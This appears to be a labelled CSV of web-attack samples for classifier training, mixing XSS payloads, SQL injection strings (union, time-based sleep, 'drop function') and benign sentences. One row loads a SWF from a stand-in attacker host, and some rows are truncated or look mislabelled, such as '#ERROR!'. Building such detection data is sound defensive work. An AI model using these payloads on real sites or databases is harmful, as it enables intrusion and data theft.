Payload,Label,text_label,ID
"<output onclick=""alert(1)"">test</output>",1,XSS,7492
select ( case when ( 7254 = 5901 ) then 1 else 725,2,SQLi,22329
Order a classic burger.,0,normal,22645
Select a book for your bookshelf.,0,normal,24201
"<div style=""x:expression((window.r==1)?'':eval('r=",1,XSS,1301
"<sub draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,6276
"<optgroup draggable=""true"" ondragend=""alert(1)"">te",1,XSS,5502
<style>:target {color: red;}</style><s id=x style=,1,XSS,6450
1%' ) and 8407 = ( select count ( * ) from generat,2,SQLi,15616
( select ( case when ( 6461 = 1802 ) then 1 else c,2,SQLi,15129
Where's your SQL documentation?,0,normal,23407
-4157' ) or 4493 = utl_inaddr.get_host_address ( c,2,SQLi,17867
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,17988
%20or%20'x'='x,2,SQLi,10154
<slot id=x tabindex=1 onbeforedeactivate=alert(1)>,1,XSS,7070
"So, astrology might not help you select the perfec",0,normal,25536
Select instruct.,0,normal,24715
1' ) and sleep ( 5 ),2,SQLi,20048
-8187' ) ) ) or 1698 = 2823#,2,SQLi,15119
<style>:target {transform: rotate(180deg);}</style,1,XSS,8750
"<font onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,5683
"\',desc users, --",2,SQLi,11552
"-4822"" or 4493 = utl_inaddr.get_host_address ( chr",2,SQLi,16784
<<script>document.vulnerable=true;</script>,1,XSS,1539
1'+ ( select 'qmtx' where 6992 = 6992 and 8148 = l,2,SQLi,18893
"{""id"":null,""firstName"":""Kiatyun"",""lastName"":""Tan"",",0,normal,27512
"1%"" ) ) and 2716 = ( select count ( * ) from sysus",2,SQLi,22437
<caption id=x tabindex=1 onactivate=alert(1)></cap,1,XSS,5558
"<sub draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,3012
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,17110
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,16687
The whitelisted version will be an option parents ,0,normal,25357
"<img oncopy=""alert(1)"" contenteditable>test</img>",1,XSS,7331
1'|| ( select 'jpso' from dual where 9357 = 9357 o,2,SQLi,12489
"<meter onbeforecut=""alert(1)"" contenteditable>test",1,XSS,4188
"Dubbed ""?Mixcloud Select,"" the new feature lets li",0,normal,26225
1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( ,2,SQLi,15149
"/</title/'/</style/</script/--><p"" onclick=alert()",1,XSS,9552
select * from users where id = 1 <@$_ union select,2,SQLi,11499
-7501'+ ( select uloc where 3089 = 3089 union all ,2,SQLi,13650
"Elijah Cummings, the top Democrat on the select Co",0,normal,26216
Select encourage.,0,normal,24734
Burr serves as chairman of the Senate Select Commi,0,normal,26316
-5967 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ),2,SQLi,13150
"<menuitem oncut=""alert(1)"" contenteditable>test</m",1,XSS,4585
"Be careful which breed you select, because althoug",0,normal,26335
"<optgroup onpaste=""alert(1)"" contenteditable>test<",1,XSS,7370
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHA",2,SQLi,10684
"<iframe src=""javascript:alert(1)"">",1,XSS,144
"{""id"":null,""firstName"":""Ricky"",""lastName"":""Lee"",""s",0,normal,27337
"1"" ) ) as wfne where 8933 = 8933",2,SQLi,21105
"You select your ISO, select your USB drive, and cl",0,normal,25057
<x oncopy=alert(1)>copy this!,1,XSS,9347
"-4927' ) ) union all select 1924,1924#",2,SQLi,14144
"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,",1,XSS,1214
1' in boolean mode ) and ( select * from ( select ,2,SQLi,20413
You can select the metering from spot to center we,0,normal,25077
<script> function b() { return Safe.get(); } alert,1,XSS,9264
1%' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( ,2,SQLi,14089
"Elizabeth Street Ventures, Maywic Select Investmen",0,normal,26215
Where's the data source?,0,normal,23468
"-5845' ) ) ) union all select 3595,3595,3595,3595,",2,SQLi,20170
Where's the psychiatrist's office?,0,normal,23662
"<picture><source srcset=""validimage.png""><image on",1,XSS,5997
1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) |,2,SQLi,20154
"<div onmousedown=""alert(1)"">test</div>",1,XSS,4275
"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 )",2,SQLi,14926
Select your vow.,0,normal,24953
<frameset onload=javascript:javascript:alert(1)></,1,XSS,787
a' --,2,SQLi,11052
"-9772' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr (",2,SQLi,14788
1' ) ) or 8421 = ( select count ( * ) from generat,2,SQLi,18103
"{""id"":null,""name"":""""}",0,normal,26754
1 ) as tykp where 6851 = 6851,2,SQLi,15795
1%' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( c,2,SQLi,12382
"<article draggable=""true"" ondragenter=""alert(1)"">t",1,XSS,7856
"In making such comparisons, it is always desirable",0,normal,26007
He decided to order a vegetarian meal.,0,normal,22924
"-9558"" where 7497 = 7497 or ( 2539 = 6484 ) *6484-",2,SQLi,13019
"-5478"" ) where 4100 = 4100 or 4747 = dbms_utility.",2,SQLi,14876
1%' ) ) ) rlike ( select * from ( select ( sleep (,2,SQLi,14262
"1%"" ) ) ) or 8156 = ( select count ( * ) from gene",2,SQLi,19292
<style>:target {color: red;}</style><plaintext id=,1,XSS,4629
"select * from generate_series ( 3180,3180,case whe",2,SQLi,17383
"In select cities, you can also order flowers from ",0,normal,25989
Select the ideal gift for someone special.,0,normal,24249
"<svg><script href=""data:text/javascript,alert(1)"" ",1,XSS,155
1 ) ) or pg_sleep ( __TIME__ ) --,2,SQLi,11471
"{""id"":null,""firstName"":""Lay Sien"",""lastName"":""Ong""",0,normal,26971
"<style>@keyframes x{}</style><image style=""animati",1,XSS,8058
Delete outdated posts from your social media.,0,normal,22958
"<table draggable=""true"" ondragstart=""alert(1)"">tes",1,XSS,8929
"<script>import('data:text/javascript,alert(1)')</s",1,XSS,157
"-4954%"" ) or 5244 = 4832",2,SQLi,22447
"<var onkeydown=""alert(1)"" contenteditable>test</va",1,XSS,3087
Sort books.,0,normal,23089
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""",1,XSS,1554
"1%' ) and updatexml ( 3393,concat ( 0x2e,0x7171706",2,SQLi,13396
`'><script>\x0Djavascript:alert(1)</script>,1,XSS,557
<style>@keyframes slidein {}</style><noframes styl,1,XSS,2150
select * from users where id = 1 + @`\` union sele,2,SQLi,11990
"<a href=""\xE2\x80\x88javascript:javascript:alert(1",1,XSS,496
Let's decide where to go for a spa retreat.,0,normal,23818
<script onblur=alert(1) tabindex=1 id=x></script><,1,XSS,2323
"-1106' ) ) union all select 2855,2855,2855,2855,28",2,SQLi,17299
<svg><animate xlink:href=#xss attributeName=href f,1,XSS,152
"{""id"":null,""name"":""Snorlax""}",0,normal,26772
Where can I select a class for my fitness routine?,0,normal,23758
"{""id"":null,""name"":""thee""}",0,normal,26770
"<EMBED SRC=""http://hacker.com/xss.swf"" AllowScript",1,XSS,1366
"1"" ) where 5491 = 5491",2,SQLi,18125
"1%"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ",2,SQLi,19388
"-8940"" ) or 4144 = ( select upper ( xmltype ( chr ",2,SQLi,18802
select ( case when ( 5322 = 6200 ) then 5322 else ,2,SQLi,15699
"1%"" ) ) ) ( select ( case when ( 4587 = 4587 ) the",2,SQLi,19270
<content onblur=alert(1) tabindex=1 id=x></content,1,XSS,3723
"<caption oncut=""alert(1)"" contenteditable>test</ca",1,XSS,7130
javascript:alert()//</title></style></textarea></n,1,XSS,9536
"select sleep ( 5 ) and ""oivc"" like ""oivc",2,SQLi,17275
"<nextid onmouseout=""alert(1)"">test</nextid>",1,XSS,5474
"-7083 union all select 7705,7705,7705,7705,7705#",2,SQLi,19588
"-8477' union all select 2517,2517,2517--",2,SQLi,22261
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4826
1'|| ( select 'ydvg' from dual where 7108 = 7108,2,SQLi,15482
"1"" ) ) and 2006 = 2006",2,SQLi,12656
"1%' ) ) ) union all select null,null,null,null,nul",2,SQLi,16730
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4139
Up to 30% off select smart and electronic door loc,0,normal,25215
-1879%' ) ) or 3038 = 3038,2,SQLi,19575
1' ) rlike sleep ( 5 ) and ( 'qsub' like 'qsub,2,SQLi,18610
-7859 ) as ipdg where 4413 = 4413 or 9323 = 9323#,2,SQLi,12391
"<ruby oncopy=""alert(1)"" contenteditable>test</ruby",1,XSS,2123
"<li onpaste=""alert(1)"" contenteditable>test</li>",1,XSS,6861
Å¾scriptualert(EXSSE)Å¾/scriptu,1,XSS,993
"1"" ) ) as oiqr where 4073 = 4073 or 8156 = ( selec",2,SQLi,13276
"( select 2768 from ( select count ( * ) ,concat ( ",2,SQLi,15874
"1"" ) ) as vtad where 3653 = 3653 procedure analyse",2,SQLi,16152
1'+ ( select kgon where 9014 = 9014 ( select ( cas,2,SQLi,21340
"1%"" rlike ( select ( case when ( 7689 = 7689 ) the",2,SQLi,21999
select ( case when ( 6276 = 6276 ) then 6276 else ,2,SQLi,15633
<script onpointerout=alert(1)>XSS</script>,1,XSS,7369
1' ) where 5286 = 5286,2,SQLi,17852
"On the current Nook Tablet, tap open the Apps icon",0,normal,25843
"<style>@keyframes x{}</style><legend style=""animat",1,XSS,3568
"<template draggable=""true"" ondragenter=""alert(1)"">",1,XSS,5843
"1%"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""%"" = """,2,SQLi,16670
select,0,normal,26620
1 ) as msat where 1267 = 1267,2,SQLi,12864
"1%' ) ) ) union all select null,null,null--",2,SQLi,18987
"<tbody draggable=""true"" ondrag=""alert(1)"">test</tb",1,XSS,8914
"<em oncopy=""alert(1)"" contenteditable>test</em>",1,XSS,4154
"1' ) union all select null,null,null,null,null,nul",2,SQLi,16078
if ( 9431 = 6730 ) select 9431 else drop function ,2,SQLi,14274
"1%"" ) ) and 6414 = ( select count ( * ) from rdb$f",2,SQLi,14133
"{""id"":null,""firstName"":""Stephan"",""lastName"":""Toh"",",0,normal,27162
1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ch,2,SQLi,20465
waitfor delay '0:0:5' and ( ( ( '%' = ',2,SQLi,13505
ORDER BY 12,2,SQLi,10316
( select ( case when ( 6714 = 8872 ) then 1 else 6,2,SQLi,20559
-4171' ) union all select 6136#,2,SQLi,20874
"-5644"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ",2,SQLi,13207
<dialog onpointerenter=alert(1)>XSS</dialog>,1,XSS,4324
<textarea autofocus onfocusin=alert(1)>test</texta,1,XSS,3164
"<dd onbeforepaste=""alert(1)"" contenteditable>test<",1,XSS,2632
The service has a handful of cable networks in sel,0,normal,25379
<noframes id=x tabindex=1 ondeactivate=alert(1)></,1,XSS,3177
<acronym onpointerenter=alert(1)>XSS</acronym>,1,XSS,2567
Select receive.,0,normal,24698
-5861' ) or 1581 = 2611 and ( 'mvjh' like 'mvjh,2,SQLi,17590
select,0,normal,26585
There are a lot of strollers out there that will h,0,normal,25335
"1"" where 1100 = 1100",2,SQLi,17003
<aside onpointerleave=alert(1)>XSS</aside>,1,XSS,3116
sleep(__TIME__)#,2,SQLi,10836
Select your fail.,0,normal,25017
-8051 ) or 5903 = ( 'qqpjq'|| ( select case 5903 w,2,SQLi,19115
"select count ( * ) from generate_series ( 1,500000",2,SQLi,13923
Select a recipe for a special meal.,0,normal,24052
"<style>@keyframes slidein {}</style><q style=""anim",1,XSS,2462
1'+ ( select 'gtqr' where 5660 = 5660,2,SQLi,14917
select * from users where id = 1 or \.<1 union sel,2,SQLi,11813
Will the Whips try to strangle independence on the,0,normal,25118
"<style>@keyframes x{}</style><q style=""animation-n",1,XSS,8095
"1"" ) where 4180 = 4180 or char ( 68 ) ||char ( 69 ",2,SQLi,17744
1 ) where 5651 = 5651,2,SQLi,20178
"<button onmousemove=""alert(1)"">test</button>",1,XSS,7801
-alert(1)//,1,XSS,9000
1' ) ) as ypgz where 8704 = 8704,2,SQLi,12889
Select the perfect angle.,0,normal,24338
"<summary draggable=""true"" ondragenter=""alert(1)"">t",1,XSS,7779
1'|| ( select 'jlka' where 5436 = 5436 or 4915 = (,2,SQLi,14204
"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) ",2,SQLi,17977
"-9860%"" union all select 6996,6996,6996,6996,6996,",2,SQLi,15492
"{""id"":null,""firstName"":""Wong"",""lastName"":""Qun Jie""",0,normal,27224
"<isindex draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,3143
-6514 ) ) as pbgg where 6841 = 6841 union all sele,2,SQLi,12475
"<param onkeydown=""alert(1)"" contenteditable>test</",1,XSS,5341
1' ) ) ) or sleep ( 5 ) and ( ( ( 'bmnf' like 'bmn,2,SQLi,20941
1 and sleep ( 5 ) # qcyj,2,SQLi,16934
"<time onmouseout=""alert(1)"">test</time>",1,XSS,7121
"<col onmouseleave=""alert(1)"">test</col>",1,XSS,6940
1'|| ( select 'kgjk' where 3530 = 3530 and 3580 = ,2,SQLi,16413
"-6086"" union all select 8700,8700,8700,8700--",2,SQLi,17454
"<picture onmouseover=""alert(1)"">test</picture>",1,XSS,3921
<var onpointerover=alert(1)>XSS</var>,1,XSS,5532
"<kbd onmousemove=""alert(1)"">test</kbd>",1,XSS,5401
email=' WAITFOR DELAY '0:0:5'--,2,SQLi,11363
"-3492"" where 4094 = 4094 or 3440 = cast ( ( chr ( ",2,SQLi,14383
"-7378' union all select 2071,2071,2071,2071,2071,2",2,SQLi,17288
1 ) where 3671 = 3671,2,SQLi,22155
UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHA,2,SQLi,10743
1' ) ) as qswu where 6377 = 6377,2,SQLi,16824
"<time oncontextmenu=""alert(1)"">test</time>",1,XSS,8323
1 where 6100 = 6100 and 2716 = ( select count ( * ,2,SQLi,15702
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11115
"<input onmouseout=""alert(1)"">test</input>",1,XSS,5272
"<style>@keyframes x{}</style><title style=""animati",1,XSS,1863
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0",2,SQLi,10894
"{""id"":null,""firstName"":""Netalie"",""lastName"":""Angel",0,normal,27440
1 ) and 5196 = 9002,2,SQLi,17491
"<maction actiontype=""statusline#http://google.com""",1,XSS,9228
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,2
"<textarea draggable=""true"" ondragenter=""alert(1)"">",1,XSS,2708
1' ) rlike sleep ( 5 ) and ( 'tslp' = 'tslp,2,SQLi,13330
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10694
<iframe src=%22404%22 onload=%22top.frames[0].docu,1,XSS,9199
"<content draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,6960
<style>:target {transform: rotate(180deg);}</style,1,XSS,2157
-2817%' ) or 8255 = 3841--,2,SQLi,21603
"<small draggable=""true"" ondrag=""alert(1)"">test</sm",1,XSS,4014
"For this reason, select toys that don't have small",0,normal,26170
"<a href=""\x06javascript:javascript:alert(1)"" id=""f",1,XSS,535
declare @s varchar ( 200 ) select @s = 0x776169746,2,SQLi,11965
"<meta draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,5826
"1' ) ) ) union all select null,null,null,null,null",2,SQLi,16972
"admin"" or ""1"" = ""1""#",2,SQLi,11878
"-9656"" union all select 8735,8735--",2,SQLi,12355
"-9997' union all select 9347,9347,9347,9347,9347,9",2,SQLi,15326
Join tables where necessary.,0,normal,23308
"{""id"":null,""name"":""Lobomon""}",0,normal,26924
Select a chair.,0,normal,22775
"<p oncut=""alert(1)"" contenteditable>test</p>",1,XSS,8686
<input type=text value=âXSSâ>,1,XSS,9746
"-5945' ) ) ) union all select 4266,4266,4266,4266,",2,SQLi,14263
1%' ) and 6537 = dbms_pipe.receive_message ( chr (,2,SQLi,15127
<deTAiLs/open/oNtoGGle=confirm()>,1,XSS,9091
if ( 8995 = 9787 ) select 8995 else drop function ,2,SQLi,16565
<data onpointermove=alert(1)>XSS</data>,1,XSS,6467
Select menu.,0,normal,24533
1' and 2316 = 7236,2,SQLi,18303
<option onblur=alert(1) tabindex=1 id=x></option><,1,XSS,8110
"1"" ) as tnux where 4888 = 4888 rlike ( select * fr",2,SQLi,14907
"<wbr oncut=""alert(1)"" contenteditable>test</wbr>",1,XSS,1912
Where's the beach house?,0,normal,23555
"-8654' union all select 7190,7190,7190,7190,7190#",2,SQLi,22143
1'|| ( select 'flbv' where 7451 = 7451 and 4595 = ,2,SQLi,17520
"{""id"":null,""name"":""Hare""}",0,normal,27023
-8999' ) ) ) or 6872 = 6872 and ( ( ( 'jare' = 'ja,2,SQLi,21996
<scrscriptipt>alert(1)</scrscriptipt>,1,XSS,1319
"<hr oncontextmenu=""alert(1)"">test</hr>",1,XSS,4371
"<div draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,8316
"-2382%' ) union all select 8885,8885,8885,8885,888",2,SQLi,20217
Select toppings carefully.,0,normal,24423
"make_set ( 7729 = 7729,1 )",2,SQLi,13857
"<li oncopy=""alert(1)"" contenteditable>test</li>",1,XSS,6083
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,21381
<style>@keyframes slidein {}</style><option style=,1,XSS,2603
"<style draggable=""true"" ondragend=""alert(1)"">test<",1,XSS,6571
1'|| ( select 'ywfo' from dual where 4168 = 4168 r,2,SQLi,18560
"{""id"":null,""name"":""again""}",0,normal,27544
"-8080"" ) as nlos where 8917 = 8917 union all selec",2,SQLi,12749
1 ) ) ) union all select null#,2,SQLi,19992
"1' ) and elt ( 4249 = 4249,7259 )",2,SQLi,13279
<details onpointermove=alert(1)>XSS</details>,1,XSS,7998
"<div id=""69""><card xmlns=""http://www.wapforum.org/",1,XSS,9145
"<marquee onmouseenter=""alert(1)"">test</marquee>",1,XSS,3771
"<label oncut=""alert(1)"" contenteditable>test</labe",1,XSS,5080
"Crate & Barrel: 230% off select dining furniture, ",0,normal,26262
<button onDeactivate=javascript:alert(1)>,1,XSS,9602
<shadow onblur=alert(1) tabindex=1 id=x></shadow><,1,XSS,4634
"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ",2,SQLi,21140
<img src=validimage.png onloadstart=alert(1)>,1,XSS,241
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,16056
"-8060"" ) where 5290 = 5290 or 5903 = ( 'qqpjq'|| (",2,SQLi,15427
The nominees that a President Hillary Clinton woul,0,normal,25405
After Republicans won control of the House in the ,0,normal,26401
1'|| ( select 'ctgs' where 6809 = 6809 or 6979 = l,2,SQLi,22271
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9b",2,SQLi,11464
"<del draggable=""true"" ondrag=""alert(1)"">test</del>",1,XSS,7468
"<script onmousemove=""alert(1)"">test</script>",1,XSS,1869
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,21200
( select ( case when ( 1938 = 1938 ) then dbms_pip,2,SQLi,18955
<rp onpointerup=alert(1)>XSS</rp>,1,XSS,2523
"-9150%' ) ) ) union all select 7057,7057,7057,7057",2,SQLi,22459
<figure id=x tabindex=1 ondeactivate=alert(1)></fi,1,XSS,1822
"<element onpaste=""alert(1)"" contenteditable>test</",1,XSS,2412
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8246
"<dt oncopy=""alert(1)"" contenteditable>test</dt>",1,XSS,6640
"1 ) where 4810 = 4810 union all select null,null#",2,SQLi,16579
"<multicol onmousemove=""alert(1)"">test</multicol>",1,XSS,4568
1' ) ) as kdwc where 5906 = 5906 union all select ,2,SQLi,14920
"-9439"" ) where 9460 = 9460 or ( 9497 = 9586 ) *958",2,SQLi,13932
"Y., Senate Select Committee on Intelligence Chairm",0,normal,25108
"<blink onbeforepaste=""alert(1)"" contenteditable>te",1,XSS,6394
<noframes onpointerleave=alert(1)>XSS</noframes>,1,XSS,2120
"union (select NULL, NULL, NULL, NULL, NULL, (selec",2,SQLi,10053
"<q onmouseout=""alert(1)"">test</q>",1,XSS,3782
Save up to 20% off select Greenworks 80V Outdoor P,0,normal,25727
<table id=x tabindex=1 ondeactivate=alert(1)></tab,1,XSS,4964
"<style>@keyframes x{}</style><samp style=""animatio",1,XSS,2811
"<a href=""\x17javascript:javascript:alert(1)"" id=""f",1,XSS,499
"select * from users where id = 1 or 1#""; union sel",2,SQLi,11448
><img src=x onerror=window.open('https://www.googl,1,XSS,919
1%' and 3715 in ( ( char ( 113 ) +char ( 113 ) +ch,2,SQLi,13393
-2869' ) ) union all select 3216--,2,SQLi,13267
"<samp oncontextmenu=""alert(1)"">test</samp>",1,XSS,4287
Delete the files.,0,normal,22833
<script>Object.prototype.documentMode = 9 </script,1,XSS,229
Select verify.,0,normal,24567
1'|| ( select 'bgdh' from dual where 1967 = 1967,2,SQLi,22365
<area id=x tabindex=1 onbeforedeactivate=alert(1)>,1,XSS,2743
select sleep ( 5 ) and ( ( 'keoy' = 'keoy,2,SQLi,13332
select * from users where id = 1.*1 or 1 = 1 -- 1,2,SQLi,11706
1' or 9643 = ( select count ( * ) from domain.doma,2,SQLi,14351
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+X,1,XSS,9274
1'+ ( select 'jkgf' where 7487 = 7487,2,SQLi,22042
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11116
<style>:target {transform: rotate(180deg);}</style,1,XSS,6004
"<header onpaste=""alert(1)"" contenteditable>test</h",1,XSS,4900
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,5586
( select * from ( select ( sleep ( 5 ) ) ) acdk ) ,2,SQLi,18752
"<samp draggable=""true"" ondrag=""alert(1)"">test</sam",1,XSS,7870
"-3817"" ) as vugz where 3064 = 3064 or 9323 = 9323#",2,SQLi,21092
#ERROR!,1,XSS,1130
-4979' ) ) or 4493 = utl_inaddr.get_host_address (,2,SQLi,22260
&&SLEEP(5)&&'1,2,SQLi,10403
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\,1,XSS,1569
ORDER BY 28#,2,SQLi,10301
%22%3e%3cscript%3ealert('XSS')%3c/script%3e,1,XSS,1708
<h1 onpointermove=alert(1)>XSS</h1>,1,XSS,3156
or pg_sleep(5)--,2,SQLi,10367
"select * from users where id = 1 or "" ( {"" or 1 = ",2,SQLi,11526
"<canvas onmouseenter=""alert(1)"">test</canvas>",1,XSS,7302
Where's your SQL expertise?,0,normal,23370
"{""id"":null,""firstName"":""Haziq"",""lastName"":""Subari""",0,normal,27079
"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>",1,XSS,6243
"onmouseover=""document.cookie=true;"">//INJECTX",1,XSS,9827
<dir onpointerenter=alert(1)>XSS</dir>,1,XSS,2927
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10493
"{""id"":null,""firstName"":""Jonas"",""lastName"":""Lee"",""a",0,normal,27276
"-3513%"" union all select 8473,8473#",2,SQLi,12447
"<embed draggable=""true"" ondragend=""alert(1)"">test<",1,XSS,2723
<style>:target {color:red;}</style><optgroup id=x ,1,XSS,7512
Select a program to watch online.,0,normal,24198
"1 ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,21919
She'll select her bouquet.,0,normal,24361
1' ) ) as iuta where 1482 = 1482,2,SQLi,13802
"-3628"" or 1570 = convert ( int, ( select char ( 11",2,SQLi,15157
Where's the best pizza place?,0,normal,23493
1 ) ) as goar where 2405 = 2405 and 5927 = 9731--,2,SQLi,14786
"end and ( ( ( ""%"" = """,2,SQLi,16347
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10835
1' ) as pxcd where 9754 = 9754 or sleep ( 5 ) --,2,SQLi,15752
<SCRIPT>a=/XSS/,1,XSS,9056
<style>@im\port'\ja\vasc\ript:document.vulnerable=,1,XSS,1507
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6057
Update your email signature.,0,normal,22737
<fieldset id=x tabindex=1 ondeactivate=alert(1)></,1,XSS,4228
"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""xjdh""",2,SQLi,18937
How to watch it: Booksmart is playing in select th,0,normal,26078
"On the other hand, if local elections are held on ",0,normal,25839
<style>:target {transform: rotate(180deg);}</style,1,XSS,6771
<figure onpointerout=alert(1)>XSS</figure>,1,XSS,3202
"If you decide you want matching napkins, select th",0,normal,26049
<marquee onpointerup=alert(1)>XSS</marquee>,1,XSS,6452
"<style>@keyframes x{}</style><tr style=""animation-",1,XSS,7954
1'+ ( select iwbs where 4939 = 4939,2,SQLi,14629
"{""id"":null,""name"":""Leopard Seal""}",0,normal,27240
"1' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( ",2,SQLi,15807
1%' ) or 1022 = ( select count ( * ) from all_user,2,SQLi,19031
<svg><i onload=alert(1)></i>,1,XSS,4438
"OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000",2,SQLi,11360
"1"" rlike sleep ( 5 ) and ""rylv"" like ""rylv",2,SQLi,21451
"1 union all select null,null,null,null,null,null#",2,SQLi,13671
"1"" ) ) as daqd where 4390 = 4390 and elt ( 3114 = ",2,SQLi,14648
"1"" ) ) ) and ( 7758 = 4628 ) *4628 and ( ( ( ""wzas",2,SQLi,15709
1' where 1652 = 1652 and sleep ( 5 ) #,2,SQLi,18448
"<style>@keyframes x{}</style><time style=""animatio",1,XSS,3778
"1%"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 10",2,SQLi,20385
"-3433' ) where 8307 = 8307 union all select 8307,8",2,SQLi,16377
<style>:target {transform: rotate(180deg);}</style,1,XSS,5599
Does the House Permanent Select Committee on Intel,0,normal,26234
<script>x=document.createElement(%22iframe%22);x.s,1,XSS,9300
For those interested in gaining exposure to these ,0,normal,26169
<template id=x tabindex=1 ondeactivate=alert(1)></,1,XSS,4177
1' ) as mara where 7164 = 7164,2,SQLi,22268
"<audio draggable=""true"" ondragleave=""alert(1)"">tes",1,XSS,8740
"<input type=""submit"">",1,XSS,9219
"-2718"" ) or 4747 = dbms_utility.sqlid_to_sqlhash (",2,SQLi,21376
"1,iif ( 6625 = 6625,1,1/0 )",2,SQLi,15584
a' or 3=3--,2,SQLi,10146
ET. Call Me By Your Name is now in select theaters,0,normal,26212
"<code onmouseenter=""alert(1)"">test</code>",1,XSS,8546
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#",1,XSS,984
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>,1,XSS,8036
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,1,XSS,5483
"1"" ) ) or 8421 = ( select count ( * ) from generat",2,SQLi,14897
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,20049
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10489
<style>:target {color:red;}</style><data id=x styl,1,XSS,4660
"<del onmouseout=""alert(1)"">test</del>",1,XSS,6417
"-6766"" where 6591 = 6591 or make_set ( 9354 = 9354",2,SQLi,15389
"<keygen onkeyup=""alert(1)"" contenteditable>test</k",1,XSS,3153
"1"" ) union all select null--",2,SQLi,21917
Delete the old photos.,0,normal,22682
if ( 8574 = 7534 ) select 8574 else drop function ,2,SQLi,15864
<script> document.getElementById(%22safe123%22).se,1,XSS,9268
<image id=x tabindex=1 onactivate=alert(1)></image,1,XSS,5972
1 ) as odqn where 3910 = 3910,2,SQLi,15001
"select * from users where id = 1 or 1#"" ( union se",2,SQLi,11894
1 where 3744 = 3744,2,SQLi,19326
